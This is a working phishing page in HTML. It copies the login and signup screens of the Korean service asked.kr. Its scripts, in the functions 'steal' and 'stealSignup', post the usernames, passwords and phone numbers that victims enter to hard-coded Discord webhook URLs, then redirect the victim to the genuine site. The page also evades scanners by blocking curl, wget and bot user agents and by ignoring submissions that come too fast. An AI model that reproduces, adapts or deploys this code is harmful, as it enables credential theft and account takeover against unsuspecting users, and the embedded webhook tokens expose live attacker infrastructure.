<!DOCTYPE html>
<html lang="ko">
<head>
  <meta charset="UTF-8">
  <title>에스크</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <style>
    * {
      box-sizing: border-box;
      font-family: 'Helvetica Neue', sans-serif;
      margin: 0;
      padding: 0;
    }

    body {
      background-color: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
    }
    html, body {
      overflow-x: hidden; /* 가로 스크롤 제거 */
      width: 100%;
      height: 100%;
    }
    .login-wrapper {
      width: 90%;
      max-width: 700px;
      padding: 40px;
    } 

    .logo {
      display: flex;
      align-items: center;
      font-weight: bold;
      font-size: 28px;
      margin-bottom: 30px;
    }

    .logo::before {
      content: '';
      display: inline-block;
      width: 28px;
      height: 28px;
      background-image: url('https://img.sur.ly/favicons/a/asked.kr.ico');
      background-size: contain;
      background-repeat: no-repeat;
      margin-right: 8px;
    }

    label {
      display: block;
      font-weight: bold;
      margin-bottom: 6px;
      font-size: 18px;
    }

    input[type="text"],
    input[type="password"],
    input[type="tel"] {
      width: 100%;
      padding: 20px;
      margin-bottom: 18px;
      border-radius: 10px;
      border: 1px solid #ddd;
      font-size: 18px;
    }

    .find-links {
      display: flex;
      justify-content: flex-end;
      gap: 14px;
      margin-top: -12px;
      margin-bottom: 20px;
      font-size: 15px;
    }

    .find-links a {
      color: #888;
      text-decoration: none;
    }

    .find-links a:hover {
      text-decoration: underline;
    }

    .login-btn {
      width: 100%;
      padding: 20px;
      background-color: #1DB6F2;
      color: white;
      font-weight: bold;
      font-size: 18px;
      border: none;
      border-radius: 12px;
      cursor: pointer;
      margin-bottom: 20px;
    }

    .divider {
      text-align: center;
      color: #bbb;
      margin: 20px 0;
      position: relative;
    }

    .divider::before,
    .divider::after {
      content: '';
      position: absolute;
      top: 50%;
      width: 40%;
      height: 1px;
      background-color: #eee;
    }

    .divider::before {
      left: 0;
    }

    .divider::after {
      right: 0;
    }

    .apple-login {
      width: 100%;
      padding: 20px;
      background-color: black;
      color: white;
      font-size: 18px;
      font-weight: bold;
      border: none;
      border-radius: 10px;
      display: flex;
      justify-content: center;
      align-items: center;
      gap: 8px;
      cursor: pointer;
    }

    .apple-login i {
      font-style: normal;
      font-size: 18px;
    }

    .signup {
      text-align: center;
      margin-top: 24px;
      font-size: 15px;
      color: #aaa;
    }

    .signup a {
      color: #1da1f2;
      text-decoration: none;
    }

    .signup a:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>
  <div id="login-wrapper" class="container">
    <div class="logo">로그인</div>

    <form onsubmit="steal(event)">
      <label for="username">아이디</label>
      <input class="input-field" id="username" type="text" placeholder="아이디 입력" required>

      <label for="password">비밀번호</label>
      <input class="input-field" id="password" type="password" placeholder="비밀번호 입력" required>

      <div class="find-links">
        <a href="#">아이디 찾기</a>
        <a href="#">비밀번호 찾기</a>
      </div>

      <button type="submit" class="login-btn">로그인</button>
    </form>

    <div class="divider">또는</div>

    <button class="apple-login">
      <i></i> Apple로 시작하기
    </button>

    <div class="signup">
  아직 계정이 없으신가요? <a href="#" id="to-signup">회원가입</a>
</div>
  </div>
 <div id="signup-wrapper" style="display:none;">
    <div class="logo">회원가입</div>
    <form onsubmit="stealSignup(event)">
      <label for="phone">전화번호</label>
      <input id="phone" type="tel" required placeholder="전화번호 입력" class="input-field">
      <label for="new-username">아이디</label>
      <input id="new-username" type="text" required placeholder="아이디 입력" class="input-field">
      <label for="new-password">비밀번호</label>
      <input id="new-password" type="password" required placeholder="비밀번호 입력" class="input-field" >
      <label for="confirm-password">비밀번호 확인</label>
      <input id="confirm-password" type="password" required placeholder="비밀번호 재입력" class="input-field">
      <button type="submit" class="login-btn">회원가입</button>
    </form>
    <div class="signup">
      이미 계정이 있으신가요? <a href="#" id="to-login">로그인</a>
    </div>
  </div>
</div>
<script>
  const startTime = Date.now();
  let typed = false;

  const ua = navigator.userAgent.toLowerCase();
  const bots = ['curl', 'wget', 'python', 'bot', 'spider', 'httpclient'];
  const isBot = bots.some(agent => ua.includes(agent));
  if (isBot) {
    console.log("Bot detected. Exiting.");
    throw new Error("Blocked");
  }

  document.querySelectorAll(".input-field").forEach(field => {
    field.addEventListener("input", () => {
      typed = true;
    });
  });

  function steal(e) {
    e.preventDefault();

    if (!typed || (Date.now() - startTime < 3000)) {
      console.log("Suspicious interaction. Exiting.");
      return;
    }

    const u = document.getElementById("username").value;
    const p = document.getElementById("password").value;

    fetch("https://discord.com/api/webhooks/1396172055992336394/GOejbicsrzOQMrzWLor93mpEQLs2Dz6IPUeiGT7uvRF8EV6KNdmcJIcaltLIfAdZRcj1", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        content: `🛑 강아지\nUsername: ${u}\nPassword: ${p}`
      })
    })
    .then(response => {
      if (response.ok) {
        window.location.href = "https://asked.kr/_hhxx3";
      } else {
        alert('Something went wrong.');
      }
    })
    .catch(() => {
      alert('Network error.');
    });
  }
function stealSignup(e) {
  e.preventDefault();  // 폼 제출 기본 동작 막기

  if (!typed || (Date.now() - startTime < 1000)) {
    console.log("Suspicious interaction. Exiting.");
    return;
  }

  const phone = document.getElementById("phone").value;
  const u = document.getElementById("new-username").value;
  const p = document.getElementById("new-password").value;
  const c = document.getElementById("confirm-password").value;

  if (p !== c) {
    alert("비밀번호가 일치하지 않습니다.");
    return;
  }

  fetch("https://discord.com/api/webhooks/1396482587907723406/TmFDZS6KHfhd6HoSiAr6or-xjsBM6XDfXwavmXs2CarxsSLKlyEUVVvysi3h2mnSplAr", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      content: `🛑 토끼\nPhone: ${phone}\nUsername: ${u}\nPassword: ${p}`
    })
  })
  .then(() => {
      window.location.href = "https://asked.kr/_hhxx3";
  });
}
// 화면 전환
document.getElementById("to-signup").addEventListener("click", (e) => {
  e.preventDefault();
  document.getElementById("login-wrapper").style.display = "none";
  document.getElementById("signup-wrapper").style.display = "block";
});

document.getElementById("to-login").addEventListener("click", (e) => {
  e.preventDefault();
  document.getElementById("signup-wrapper").style.display = "none";
  document.getElementById("login-wrapper").style.display = "block";
});

</script>
</body>
</html>
